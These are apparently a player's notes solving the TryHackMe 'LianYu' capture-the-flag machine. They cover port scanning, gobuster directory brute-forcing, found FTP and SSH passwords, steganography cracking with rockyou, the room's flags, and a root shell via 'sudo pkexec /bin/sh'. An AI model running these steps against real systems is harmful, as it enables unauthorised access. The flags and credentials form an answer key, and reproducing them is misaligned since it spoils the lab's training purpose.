<pre>
Machine IP: 10.10.95.45

Enum:
    Open ports:
        21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35739/tcp6  status
|   100024  1          44092/tcp   status
|   100024  1          60686/udp   status
|_  100024  1          60726/udp6  status


        


Code word : vigilante

Enum gobuster:
    gobuster dir --url http://10.10.95.45/ --wordlist /root/Documents/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

/island (Status: 301)


gobuster dir --url http://10.10.95.45/island --wordlist /root/Documents/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
/2100 (Status: 301)

gobuster dir --url http://10.10.95.45/island/2100 --wordlist /root/Documents/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .ticket
/green_arrow.ticket

vigilante : !#th3h00d

Login ftp:

Find some png files and download it 

stegcracker aa.jpg /root/Documents/wordlists/rockyou.txt
steghide --extract -sf aa.jpg

Ssh password

ssh slade@10.10.95.45
M3tahuman

User flag: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
Root flag : THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}

Priv esc 
sudo -l
[sudo] password for slade:
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec


sudo pkexec /bin/sh


https://gtfobins.github.io/gtfobins/pkexec/
</pre>
